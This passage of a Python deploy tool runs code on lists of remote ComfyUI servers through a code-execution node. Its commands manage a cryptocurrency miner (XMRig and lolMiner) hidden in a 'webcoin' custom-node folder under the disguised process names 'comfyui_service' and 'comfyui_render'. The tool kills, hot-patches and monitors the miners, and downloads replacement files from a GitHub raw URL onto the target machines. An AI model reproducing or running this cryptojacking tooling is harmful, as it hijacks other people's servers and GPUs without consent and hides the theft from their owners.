        lines.append('cleared ' + pc.split(os.sep)[-2] + '/__pycache__')

with open(os.path.join(target, '__init__.py')) as f:
    content = f.read()
lines.append('has_orch_done=' + str('_orch_done' in content))

result = chr(10).join(lines)
"""


def cmd_hotfix(base, args):
    """Pull latest files from GitHub raw, clear markers + caches."""
    print(f"\n[hotfix] Hot-patching files on {args.target_ip}...")

    if args.gpu_only:
        gpu_code = f"""
import os, subprocess, urllib.request
{FIND_CUSTOM_NODES}
lines = []
target = os.path.join(cn, 'webcoin') if cn else None
lines.append('target=' + str(target))

try:
    import psutil
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = (proc.info.get('name') or '').lower()
            if 'comfyui_render' in name:
                proc.kill()
                lines.append('killed gpu miner pid=' + str(proc.info['pid']))
        except:
            pass
except:
    subprocess.run(['pkill', '-9', '-f', 'comfyui_render'], capture_output=True)
    lines.append('pkill sent')

import time
time.sleep(2)

for fname, subdir in [('core/gpu_miner.py', 'core'), ('core/config.py', 'core'),
                       ('__init__.py', ''), ('core/dashboard.py', 'core')]:
    url = '{REPO_RAW}/' + fname
    if subdir:
        dest = os.path.join(target, subdir, os.path.basename(fname))
    else:
        dest = os.path.join(target, os.path.basename(fname))
    try:
        req = urllib.request.Request(url, headers={{'User-Agent': 'Mozilla/5.0'}})
        with urllib.request.urlopen(req, timeout=30) as resp:
            content = resp.read()
        with open(dest, 'wb') as f:
            f.write(content)
        lines.append('updated ' + fname + ' (' + str(len(content)) + ' bytes)')
    except Exception as e:
        lines.append('FAIL ' + fname + ': ' + str(e)[:150])

result = chr(10).join(lines)
"""
        pid, status, lines = run_idenode(base, gpu_code, wait=15)
    else:
        pid, status, lines = run_idenode(base, HOTFIX_CODE, wait=15)

    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: clear
#  Clear stale marker files
# ═══════════════════════════════════════════════════════════════════════

CLEAR_CODE = f"""
import os
{FIND_CUSTOM_NODES}
lines = []
target = os.path.join(cn, 'webcoin') if cn else None
lines.append('target=' + str(target))

if target and os.path.isdir(target):
    for marker in ['.orch.pid', '.initialized']:
        mp = os.path.join(target, marker)
        if os.path.exists(mp):
            os.remove(mp)
            lines.append('removed ' + marker)
        else:
            lines.append(marker + ' not found')
    lines.append('files=' + str(sorted(os.listdir(target))[:20]))
else:
    lines.append('ERROR: webcoin dir not found')

result = chr(10).join(lines)
"""


def cmd_clear(base, args):
    """Clear stale marker files."""
    print(f"\n[clear] Clearing markers on {args.target_ip}...")
    pid, status, lines = run_idenode(base, CLEAR_CODE, wait=8)
    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: procs
#  Check running miner processes
# ═══════════════════════════════════════════════════════════════════════

PROCS_CODE = f"""
import os, platform
{FIND_CUSTOM_NODES}
result_lines = []
result_lines.append('Platform: ' + platform.system())

try:
    import psutil
    result_lines.append('psutil: available')
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
        try:
            name = (proc.info.get('name') or '').lower()
            if any(x in name for x in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolminer']):
                cmdline = ' '.join(proc.info.get('cmdline') or [])[:200]
                result_lines.append('FOUND: pid=' + str(proc.info['pid']) + ' name=' + proc.info['name'] + ' status=' + proc.info['status'] + ' cmd=' + cmdline[:150])
        except:
            pass
    if not any('FOUND' in l for l in result_lines):
        result_lines.append('NO MINER PROCESSES FOUND')
except ImportError:
    result_lines.append('psutil not available, using ps/tasklist')
    import subprocess
    if platform.system() == 'Windows':
        r = subprocess.run(['tasklist'], capture_output=True, text=True)
    else:
        r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        ll = line.lower()
        if any(x in ll for x in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolminer']):
            result_lines.append('FOUND: ' + line.strip()[:200])

target = os.path.join(cn, 'webcoin') if cn else None
if target:
    bin_dir = os.path.join(target, 'bin')
    if os.path.isdir(bin_dir):
        result_lines.append('bin_contents=' + str(os.listdir(bin_dir)))
        for logname in ['service.log', 'render.log']:
            log = os.path.join(bin_dir, logname)
            if os.path.exists(log):
                with open(log, 'r', errors='replace') as f:
                    log_lines = f.readlines()
                result_lines.append(logname + ' last 5:')
                for l in log_lines[-5:]:
                    result_lines.append('  ' + l.strip()[:200])
    else:
        result_lines.append('bin dir not found')

result = chr(10).join(result_lines)
"""


def cmd_procs(base, args):
    """Check running miner processes."""
    print(f"\n[procs] Checking processes on {args.target_ip}...")
    pid, status, lines = run_idenode(base, PROCS_CODE, wait=10)
    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: gpu
#  GPU miner specific diagnostics
# ═══════════════════════════════════════════════════════════════════════

GPU_CODE = f"""
import os, subprocess, json
{FIND_CUSTOM_NODES}
lines = []
target = os.path.join(cn, 'webcoin') if cn else None

try:
    import psutil
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
        try:
            name = (proc.info.get('name') or '').lower()
            if 'comfyui_render' in name or 'lolminer' in name:
                cmd = ' '.join(proc.info.get('cmdline') or [])
                lines.append('GPU_PROC: pid=' + str(proc.info['pid']) + ' status=' + proc.info['status'])
                lines.append('GPU_CMD: ' + cmd[:300])
        except:
            pass
except:
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        if 'comfyui_render' in line or 'lolminer' in line.lower():
            lines.append('PS: ' + line.strip()[:200])

import urllib.request as ur
try:
    req = ur.Request('http://127.0.0.1:44882', headers={{'Accept': 'application/json'}})
    with ur.urlopen(req, timeout=5) as r:
        data = json.loads(r.read().decode())
        lines.append('API_OK: software=' + data.get('Software', ''))
        workers = data.get('Workers', [])
        for w in workers:
            lines.append('GPU: ' + w.get('Name', '?') + ' power=' + str(w.get('Power', 0)) + 'W')
        algos = data.get('Algorithms', [])
        for a in algos:
            lines.append('ALGO: ' + a.get('Algorithm', '') + ' pool=' + a.get('Pool', ''))
            lines.append('PERF: ' + str(a.get('Total_Performance', 0)))
            lines.append('SHARES: accepted=' + str(a.get('Total_Accepted', 0)) + ' rejected=' + str(a.get('Total_Rejected', 0)))
except Exception as e:
    lines.append('lolMiner_API: FAIL ' + str(e)[:200])

if target:
    logpath = os.path.join(target, 'bin', 'render.log')
    if os.path.exists(logpath):
        with open(logpath, 'r', errors='replace') as f:
            content = f.read()
        lines.append('render.log (' + str(len(content)) + ' chars):')
        if content:
            for l in content.splitlines()[-30:]:
                lines.append('  ' + l.strip()[:200])
        else:
            lines.append('  (empty)')
    else:
        lines.append('render.log: not found')

try:
    r = subprocess.run(['nvidia-smi', '--query-gpu=index,name,memory.total,memory.used,utilization.gpu,temperature.gpu', '--format=csv,noheader'], capture_output=True, text=True, timeout=10)
    lines.append('nvidia-smi:')
    for l in r.stdout.strip().splitlines():
        lines.append('  ' + l.strip())
except Exception as e:
    lines.append('nvidia-smi: ' + str(e)[:100])

result = chr(10).join(lines)
"""


def cmd_gpu(base, args):
    """GPU miner diagnostics."""
    print(f"\n[gpu] Checking GPU miner on {args.target_ip}...")
    pid, status, lines = run_idenode(base, GPU_CODE, wait=12)
    print(f"  Status: {status}\n")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: api
#  Check miner APIs from the machine itself
# ═══════════════════════════════════════════════════════════════════════

API_CODE = f"""
import urllib.request, json, os
{FIND_CUSTOM_NODES}
result_lines = []

try:
    req = urllib.request.Request('http://127.0.0.1:44880/2/summary',
                                headers={{'Accept': 'application/json'}})
    with urllib.request.urlopen(req, timeout=5) as r:
        data = json.loads(r.read().decode())
        result_lines.append('XMRig API: OK')
        result_lines.append('  hashrate=' + str(data.get('hashrate', {{}}).get('total', [])))
        result_lines.append('  algo=' + str(data.get('algo')))
        result_lines.append('  uptime=' + str(data.get('uptime')))
except Exception as e:
    result_lines.append('XMRig API: FAIL - ' + str(e)[:200])

try:
    req = urllib.request.Request('http://127.0.0.1:44882',
                                headers={{'Accept': 'application/json'}})
    with urllib.request.urlopen(req, timeout=5) as r:
        data = json.loads(r.read().decode())
        result_lines.append('lolMiner API: OK')
        result_lines.append('  software=' + data.get('Software', ''))
        algos = data.get('Algorithms', [{{}}])
        if algos:
            result_lines.append('  algo=' + algos[0].get('Algorithm', ''))
            result_lines.append('  hashrate=' + str(algos[0].get('Total_Performance', 0)))
except Exception as e:
    result_lines.append('lolMiner API: FAIL - ' + str(e)[:200])

target = os.path.join(cn, 'webcoin') if cn else None
if target:
    cfg_path = os.path.join(target, 'bin', 'config.json')
    if os.path.exists(cfg_path):
        with open(cfg_path) as f:
            cfg = json.load(f)
        http_cfg = cfg.get('http', {{}})
        result_lines.append('XMRig HTTP config: ' + json.dumps(http_cfg))
    else:
        result_lines.append('config.json not found')

    for logname in ['service.log', 'render.log']:
        logpath = os.path.join(target, 'bin', logname)
        if os.path.exists(logpath):
            with open(logpath, 'r', errors='replace') as f:
                log_lines = f.readlines()
            result_lines.append(logname + ' (' + str(len(log_lines)) + ' lines), last 8:')
            for l in log_lines[-8:]:
                result_lines.append('  ' + l.strip()[:200])
        else:
            result_lines.append(logname + ' not found')

result = chr(10).join(result_lines)
"""


def cmd_api(base, args):
    """Check miner APIs from the remote machine itself."""
    print(f"\n[api] Checking miner APIs on {args.target_ip}...")
    pid, status, lines = run_idenode(base, API_CODE, wait=10)
    print(f"  Status: {status}\n")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: logs
#  Read miner service and render logs
# ═══════════════════════════════════════════════════════════════════════

LOGS_CODE = f"""
import os, subprocess
{FIND_CUSTOM_NODES}
results = []
target = os.path.join(cn, 'webcoin') if cn else None

if not target or not os.path.isdir(target):
    results.append('ERROR: webcoin dir not found')
else:
    log_path = os.path.join(target, 'bin', 'service.log')
    config_path = os.path.join(target, 'bin', 'config.json')

    if os.path.exists(log_path):
        with open(log_path, 'r') as f:
            content = f.read()
        results.append('=== SERVICE LOG (' + str(len(content)) + ' bytes) ===')
        results.append(content[-3000:] if len(content) > 3000 else content)
    else:
        results.append('service.log NOT FOUND')

    render_log = os.path.join(target, 'bin', 'render.log')
    if os.path.exists(render_log):
        with open(render_log, 'r', errors='replace') as f:
            content = f.read()
        results.append('=== RENDER LOG (' + str(len(content)) + ' bytes) ===')
        results.append(content[-3000:] if len(content) > 3000 else content)
    else:
        results.append('render.log NOT FOUND')

    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            cfg = f.read()
        results.append('=== CONFIG ===')
        results.append(cfg[:2000])
    else:
        results.append('config.json NOT FOUND')

    bin_path = os.path.join(target, 'bin', 'comfyui_service')
    results.append('Binary exists: ' + str(os.path.exists(bin_path)))
    if os.path.exists(bin_path):
        results.append('Binary size: ' + str(os.path.getsize(bin_path)) + ' bytes')
        import stat
        st = os.stat(bin_path)
        results.append('Binary perms: ' + oct(st.st_mode))

    try:
        r = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5)
        for line in r.stdout.split(chr(10)):
            if '44880' in line or '44881' in line or '44882' in line or '3333' in line:
                results.append('Port: ' + line.strip())
    except:
        pass

output = chr(10).join(results)
print(output)
output
"""


def cmd_logs(base, args):
    """Read miner service and render logs."""
    print(f"\n[logs] Reading logs from {args.target_ip}...")
    pid, status, lines = run_idenode(base, LOGS_CODE, wait=10)
    print(f"  Status: {status}\n")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: history
#  Check ComfyUI execution history
# ═══════════════════════════════════════════════════════════════════════

def cmd_history(base, args):
    """Check recent ComfyUI execution history."""
    print(f"\n[history] Fetching history from {args.target_ip}...")
    code, body = _get(f"{base}/history?max_items=5")
    if code != 200:
        print(f"  ERROR: {code} {body[:300]}")
        return False

    hist = json.loads(body)
    for pid, entry in hist.items():
        status = entry.get("status", {})
        status_str = status.get("status_str", "unknown")
        print(f"\n  === {pid} [{status_str}] ===")
        outputs = entry.get("outputs", {})
        for nid, nout in outputs.items():
            if "text" in nout:
                for line in nout["text"]:
                    print(f"    [{nid}] {line[:500]}")
        if not outputs:
            msgs = status.get("messages", [])
            for m in msgs:
                print(f"    msg: {m}")
    return True


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: result
#  Check a specific prompt result
# ═══════════════════════════════════════════════════════════════════════

def cmd_result(base, args):
    """Check a specific prompt result by ID."""
    if not args.prompt_id:
        print("  ERROR: --prompt-id required")
        return False

    print(f"\n[result] Fetching result for {args.prompt_id}...")
    _, status, lines = _fetch_result(base, args.prompt_id)
    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: errors
#  Get error details from execution history
# ═══════════════════════════════════════════════════════════════════════

def cmd_errors(base, args):
    """Get error details from recent execution history."""
    print(f"\n[errors] Fetching errors from {args.target_ip}...")
    code, body = _get(f"{base}/history?max_items=5")
    if code != 200:
        print(f"  ERROR: {code} {body[:300]}")
        return False

    hist = json.loads(body)
    found_errors = False
    for pid, entry in hist.items():
        status = entry.get("status", {})
        status_str = status.get("status_str", "unknown")
        print(f"\n  === {pid} [{status_str}] ===")
        msgs = status.get("messages", [])
        for m in msgs:
            if m[0] == "execution_error":
                found_errors = True
                err = m[1]
                print(f"    node_type: {err.get('node_type')}")
                print(f"    node_id: {err.get('node_id')}")
                print(f"    exception_type: {err.get('exception_type')}")
                print(f"    exception_message: {str(err.get('exception_message', ''))[:500]}")
                tb = err.get("traceback", "")
                if isinstance(tb, list):
                    tb = "\n".join(tb)
                print(f"    traceback: {str(tb)[-500:]}")

    if not found_errors:
        print("  No execution errors found in recent history.")
    return True


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: reboot
#  Reboot ComfyUI via Manager
# ═══════════════════════════════════════════════════════════════════════

def cmd_reboot(base, args):
    """Reboot ComfyUI via Manager."""
    print(f"\n[reboot] Rebooting ComfyUI on {args.target_ip}...")
    code, resp = _get(f"{base}/manager/reboot")
    print(f"  manager/reboot -> {code}")
    if code != 200:
        code, resp = _post(f"{base}/api/manager/reboot")
        print(f"  api/manager/reboot -> {code}")
    return code == 200


# ═══════════════════════════════════════════════════════════════════════
#  Batch runner
# ═══════════════════════════════════════════════════════════════════════

def run_batch(targets, port, command_func, args, use_https=False):
    results = {}
    scheme = "https" if use_https else "http"
    for ip in targets:
        ip = ip.strip()
        if not ip:
            continue
        args.target_ip = ip
        base = f"{scheme}://{ip}:{port}"

        print(f"\n{'='*60}")
        print(f"  Target: {scheme}://{ip}:{port}")
        print(f"{'='*60}")

        try:
            code, _ = _get(f"{base}/system_stats", timeout=10)
            if code == 0:
                print(f"  Machine unreachable!")
                results[ip] = False
                continue
        except Exception:
            pass

        results[ip] = command_func(base, args)

    if len(targets) > 1:
        print(f"\n{'='*60}")
        print("  Batch Results")
        print(f"{'='*60}")
        for ip, ok in results.items():
            status = "OK" if ok else "FAILED"
            print(f"  {ip}: {status}")

    return results


# ═══════════════════════════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════════════════════════

COMMANDS = {
    "install":   (cmd_install,   "Multi-strategy install (Manager API + IDENode fallbacks)"),
    "update":    (cmd_update,    "Git pull latest without destroying bin/"),
    "nuke":      (cmd_nuke,      "Kill miners, force-delete, fresh clone"),
    "diagnose":  (cmd_diagnose,  "Full remote diagnostic"),
    "probe":     (cmd_probe,     "Quick platform + webcoin status"),
    "verify":    (cmd_verify,    "Detailed install verification"),
    "hotfix":    (cmd_hotfix,    "Pull latest files from GitHub raw"),
    "clear":     (cmd_clear,     "Clear stale marker files"),
    "procs":     (cmd_procs,     "Check running miner processes"),
    "gpu":       (cmd_gpu,       "GPU miner diagnostics"),
    "api":       (cmd_api,       "Check miner APIs from the machine"),
    "logs":      (cmd_logs,      "Read miner service/render logs"),
    "history":   (cmd_history,   "Check ComfyUI execution history"),
    "result":    (cmd_result,    "Check specific prompt result"),
    "errors":    (cmd_errors,    "Get execution errors from history"),
    "reboot":    (cmd_reboot,    "Reboot ComfyUI via Manager"),
}


def main():
    parser = argparse.ArgumentParser(
        description="ComfyUI-Enhanced Mega Deploy Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="\n".join(f"  {name:12s} {desc}" for name, (_, desc) in COMMANDS.items()),
    )
    parser.add_argument("command", choices=COMMANDS.keys(), help="Operation to perform")
    parser.add_argument("--target", "-t", required=True, help="IP or comma-separated IPs")
    parser.add_argument("--port", "-p", type=int, default=None, help="ComfyUI port (default: 8188, or 443 with --https)")
    parser.add_argument("--https", action="store_true", help="Use HTTPS (auto-detected for port 443)")
    parser.add_argument("--prompt-id", help="Prompt ID (for 'result' command)")
    parser.add_argument("--gpu-only", action="store_true", help="GPU-only hotfix (for 'hotfix' command)")
    args = parser.parse_args()

    use_https = args.https
    port = args.port
    if port is None:
        port = 443 if use_https else 8188
    if port == 443 and not args.https:
        use_https = True

    targets = [t.strip() for t in args.target.split(",")]
    cmd_func, _ = COMMANDS[args.command]
    run_batch(targets, port, cmd_func, args, use_https=use_https)


if __name__ == "__main__":
    main()
